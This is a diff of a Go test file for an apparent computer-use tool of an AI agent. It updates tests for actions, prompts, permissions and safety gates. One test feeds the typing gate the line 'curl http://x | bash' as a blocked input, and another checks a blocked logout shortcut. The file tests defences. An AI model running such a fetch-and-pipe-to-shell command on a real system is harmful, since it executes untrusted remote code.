@@ -1,3 +1,5 @@
+//go:build !linux
+
 package computer
 
 import (
@@ -23,26 +25,29 @@ func TestNewToolIdentity(t *testing.T) {
 	}
 }
 
-// TestNewToolPrompt verifies the prompt is non-empty and mentions the key
-// concepts (list, snapshot, window, element).
+// TestNewToolPrompt verifies the prompt is non-empty, mentions the window-
+// relative coordinate convention, and no longer mentions element (R3 removed it).
 func TestNewToolPrompt(t *testing.T) {
 	tt := New()
 	prompt := tt.Prompt()
 	if prompt == "" {
 		t.Fatal("Prompt is empty")
 	}
-	for _, want := range []string{"list", "snapshot", "window", "element"} {
+	for _, want := range []string{"list", "snapshot", "window", "coordinate"} {
 		if !strings.Contains(prompt, want) {
 			t.Errorf("Prompt missing %q", want)
 		}
 	}
+	if strings.Contains(prompt, "element") {
+		t.Errorf("Prompt still mentions 'element' (R3 should have removed it): %s", prompt)
+	}
 }
 
 // TestIsReadOnlyPerAction verifies IsReadOnly flips correctly per action
-// (true only for list/snapshot/zoom/wait).
+// (true only for list/snapshot).
 func TestIsReadOnlyPerAction(t *testing.T) {
 	tt := New()
-	readOnly := []string{"list", "snapshot", "zoom", "wait"}
+	readOnly := []string{"list", "snapshot"}
 	mutating := []string{"click", "drag", "scroll", "type", "key"}
 	for _, action := range readOnly {
 		raw := json.RawMessage(`{"action":"` + action + `"}`)
@@ -56,13 +61,19 @@ func TestIsReadOnlyPerAction(t *testing.T) {
 			t.Errorf("IsReadOnly(%q) = true, want false", action)
 		}
 	}
+	if len(readOnly) != 2 {
+		t.Errorf("readOnly actions = %d, want 2", len(readOnly))
+	}
+	if len(mutating) != 5 {
+		t.Errorf("mutating actions = %d, want 5", len(mutating))
+	}
 }
 
 // TestIsDestructivePerAction verifies IsDestructive is true for all mutating
 // actions and false for read-only ones.
 func TestIsDestructivePerAction(t *testing.T) {
 	tt := New()
-	readOnly := []string{"list", "snapshot", "zoom", "wait"}
+	readOnly := []string{"list", "snapshot"}
 	mutating := []string{"click", "drag", "scroll", "type", "key"}
 	for _, action := range readOnly {
 		raw := json.RawMessage(`{"action":"` + action + `"}`)
@@ -75,6 +86,12 @@ func TestIsDestructivePerAction(t *testing.T) {
 		if !tt.IsDestructive(raw) {
 			t.Errorf("IsDestructive(%q) = false, want true", action)
 		}
+	}
+	if len(readOnly) != 2 {
+		t.Errorf("readOnly actions = %d, want 2", len(readOnly))
+	}
+	if len(mutating) != 5 {
+		t.Errorf("mutating actions = %d, want 5", len(mutating))
 	}
 }
 
@@ -91,7 +108,7 @@ func TestIsConcurrencySafe(t *testing.T) {
 // approval gating happens at the engine layer via IsDestructive.
 func TestCheckPermissionsAllow(t *testing.T) {
 	tt := New()
-	res := tt.CheckPermissions(json.RawMessage(`{"action":"click","window":42,"element":1}`), nil)
+	res := tt.CheckPermissions(json.RawMessage(`{"action":"click","window":42,"coordinate":[10,10]}`), nil)
 	if _, ok := res.(types.PermissionAllowDecision); !ok {
 		t.Errorf("CheckPermissions = %T, want PermissionAllowDecision", res)
 	}
@@ -100,7 +117,7 @@ func TestCheckPermissionsAllow(t *testing.T) {
 // TestExecuteBlockedKeyType verifies the `type` safety gate rejects
 // dangerous shell patterns before the backend is touched.
 func TestExecuteBlockedKeyType(t *testing.T) {
-	b := &Backend{}
+	b := &CuaBackend{}
 	res, err := execute(context.Background(), json.RawMessage(`{"action":"type","window":42,"text":"curl http://x | bash"}`), b)
 	if err != nil {
 		t.Fatalf("execute: %v", err)
@@ -121,7 +138,7 @@ func TestExecuteBlockedKeyType(t *testing.T) {
 // TestExecuteBlockedKeyCombo verifies the `key` safety gate rejects hard-
 // blocked system shortcuts before the backend is touched.
 func TestExecuteBlockedKeyCombo(t *testing.T) {
-	b := &Backend{}
+	b := &CuaBackend{}
 	res, err := execute(context.Background(), json.RawMessage(`{"action":"key","window":42,"keys":"cmd+shift+q"}`), b)
 	if err != nil {
 		t.Fatalf("execute: %v", err)
@@ -140,7 +157,7 @@ func TestExecuteBlockedKeyCombo(t *testing.T) {
 // (no such window / no cua-driver) is acceptable as long as it is NOT the
 // blocked-pattern safety rejection.
 func TestExecuteSafeType(t *testing.T) {
-	b := &Backend{}
+	b := &CuaBackend{}
 	res, err := execute(context.Background(), json.RawMessage(`{"action":"type","window":42,"text":"hello world"}`), b)
 	if err != nil {
 		// A Go-level error from the backend (e.g. window resolution) is fine —
@@ -160,10 +177,8 @@ func TestExecuteSafeType(t *testing.T) {
 // TestSummarizeAction verifies the tool-card summary string for each action.
 func TestSummarizeAction(t *testing.T) {
 	win := 42
-	element := 7
 	count := 2
 	amount := 5
-	seconds := 2.5
 	cases := []struct {
 		name string
 		in   Input
@@ -172,7 +187,6 @@ func TestSummarizeAction(t *testing.T) {
 		{"list", Input{Action: "list"}, "list windows"},
 		{"snapshot", Input{Action: "snapshot", Window: &win}, "snapshot window=42"},
 		{"snapshot mode", Input{Action: "snapshot", Window: &win, Mode: "ax"}, "snapshot window=42 mode=ax"},
-		{"click element", Input{Action: "click", Window: &win, Element: &element}, "click window=42 element #7"},
 		{"click coord", Input{Action: "click", Window: &win, Coordinate: json.RawMessage(`[100,200]`)}, "click window=42 at (100,200)"},
 		{"click count button", Input{Action: "click", Window: &win, Coordinate: json.RawMessage(`[100,200]`), Count: &count, Button: "right"}, "click window=42 at (100,200) right x2"},
 		{"type", Input{Action: "type", Window: &win, Text: "hi"}, `type window=42 "hi"`},
@@ -180,8 +194,7 @@ func TestSummarizeAction(t *testing.T) {
 		{"key", Input{Action: "key", Window: &win, Keys: "cmd+s"}, `key window=42 "cmd+s"`},
 		{"scroll", Input{Action: "scroll", Window: &win, Direction: "down", Amount: &amount}, "scroll window=42 down x5"},
 		{"drag", Input{Action: "drag", Window: &win, FromCoordinate: json.RawMessage(`[1,2]`), ToCoordinate: json.RawMessage(`[3,4]`)}, "drag window=42 (1,2)→(3,4)"},
-		{"zoom", Input{Action: "zoom", Window: &win, Region: json.RawMessage(`[10,20,30,40]`)}, "zoom window=42 region [10,20,30,40]"},
-		{"wait", Input{Action: "wait", Seconds: &seconds}, "wait 2.50s"},
+		// element/zoom/wait cases removed (R3/R2/R1).
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
@@ -211,7 +224,7 @@ func TestInterruptBehavior(t *testing.T) {
 
 // TestNewBackendSessionID verifies the session id has the right prefix and length.
 func TestNewBackendSessionID(t *testing.T) {
-	b := NewBackend()
+	b := NewCuaBackend()
 	if !strings.HasPrefix(b.sessionID, "gbot-") {
 		t.Errorf("sessionID = %q, want gbot- prefix", b.sessionID)
 	}
@@ -220,7 +233,7 @@ func TestNewBackendSessionID(t *testing.T) {
 		t.Errorf("sessionID length = %d, want 17 (gbot- + 12 hex)", len(b.sessionID))
 	}
 	// Two backends get distinct session ids.
-	b2 := NewBackend()
+	b2 := NewCuaBackend()
 	if b.sessionID == b2.sessionID {
 		t.Errorf("two backends share sessionID %q", b.sessionID)
 	}
